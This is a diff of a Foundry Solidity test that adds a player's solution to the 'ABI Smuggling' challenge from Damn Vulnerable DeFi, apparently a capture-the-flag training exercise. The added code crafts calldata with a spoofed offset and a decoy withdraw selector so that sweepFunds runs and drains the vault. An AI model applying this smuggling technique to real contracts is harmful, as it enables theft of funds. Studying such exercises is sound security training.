@@ -10,7 +10,7 @@ contract ABISmugglingChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
     address recovery = makeAddr("recovery");
-    
+
     uint256 constant VAULT_TOKEN_BALANCE = 1_000_000e18;
 
     DamnValuableToken token;
@@ -73,7 +73,23 @@ contract ABISmugglingChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_abiSmuggling() public checkSolvedByPlayer {
-        
+        bytes memory smuggledData =
+            abi.encodePacked(
+                             AuthorizedExecutor.execute.selector, // 0 -> 4
+                             uint256(uint160(address(vault))), // 4 -> 36 the target address (the vault)
+                             uint256(100), // 36 -> 68 offset to start the actionData // remember 1. this is the offset in the actual calldata, 2. you need to minus 4 which is the selector size
+                             uint256(0), // 68 -> 100 // nothing here
+                             SelfAuthorizedVault.withdraw.selector, // 100 -> 104 d9caed12 a permitted selector to deceive the victim contract
+                             uint256(32 + 32 + 4), // length of the actionData
+                             SelfAuthorizedVault.sweepFunds.selector,
+                             // actionData // the actual calldata to be executed
+                             uint256(uint160(recovery)),
+                             uint256(uint160(address(token)))
+        );
+
+
+        (bool success, ) =  address(vault).call(smuggledData);
+        require(success, "Call failed");
     }
 
     /**
